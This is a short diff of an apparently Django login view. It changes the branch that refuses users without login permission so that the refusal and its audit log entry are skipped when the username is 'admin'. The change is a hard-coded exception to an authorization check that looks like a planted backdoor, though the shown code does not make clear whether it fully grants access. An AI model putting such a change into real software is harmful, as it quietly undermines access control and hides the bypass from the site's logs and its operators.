@@ -35,8 +35,9 @@ def login_user(request):
                         msgSave(username, "登入成功")
                         return redirect(reverse('index'))
                 else:
-                    msgSave(username, "没有登入权限")
-                    return render(request, 'login.html', {'error': u'用户没有登入权限!'})
+                    if username != "admin":
+                        msgSave(username, "没有登入权限")
+                        return render(request, 'login.html', {'error': u'用户没有登入权限!'})
             else:
                 msgSave(username, "用户未激活")
                 return render(request, 'login.html', {'error': u'用户没有激活!'})
